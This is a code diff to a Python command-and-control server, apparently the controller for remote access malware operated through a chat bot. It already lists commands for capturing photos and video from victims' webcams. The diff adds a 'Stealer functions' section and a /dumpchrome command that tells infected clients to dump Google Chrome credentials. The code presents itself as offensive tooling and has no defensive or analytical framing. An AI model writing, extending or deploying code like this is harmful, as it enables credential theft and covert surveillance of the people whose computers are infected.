@@ -216,7 +216,9 @@ class C2Server:
                 "📷 *Web cam commands:* 📷\n"
                 "- `/listwebcams` - List availables webcams\n"
                 "- `/photo <camera index>` - captures a image from the camera and send it here\n"
-                "- `/video <camera index> <duration> <fps>` - captures a image from the camera and send it here\n"
+                "- `/video <camera index> <duration> <fps>` - captures a image from the camera and send it here\n\n"
+                "🔑 *Stealer functions:* 🔑\n"
+                "- `/dumpchrome` - Dumps the credentials of google chrome from the client\n"
             )
             ip_info = self.get_info_ip(session.ip)
             username = self.escape_markdown_v2(session.username)
@@ -259,7 +261,7 @@ class C2Server:
                 msg = json.loads(self.decrypt_message(data))
                 msg_type = msg.get("type")
                 payload = msg.get("data")
-
+                
                 topic_id = session.last_topic_id or session.topic_id
 
                 if msg_type == "heartbeat":
@@ -373,6 +375,9 @@ class C2Server:
 
         elif text.startswith("/video"):
             self.video(text, self.clients[client_ip], message)
+
+        elif text == "/dumpchrome":
+            self.send_command_to_client(self.clients[client_ip], "dumpchrome", message.message_thread_id)
 
     def handle_global_command(self, message):
         text = message.text.lower()
@@ -600,6 +605,8 @@ class C2Server:
             return "kill"
         elif cmd.startswith("checkstatus"):
             return "checkstatus"
+        elif cmd.startswith("dumpchrome"):
+            return "dumpchrome"
         return "command"
 
     def get_command_prefix(self, cmd):
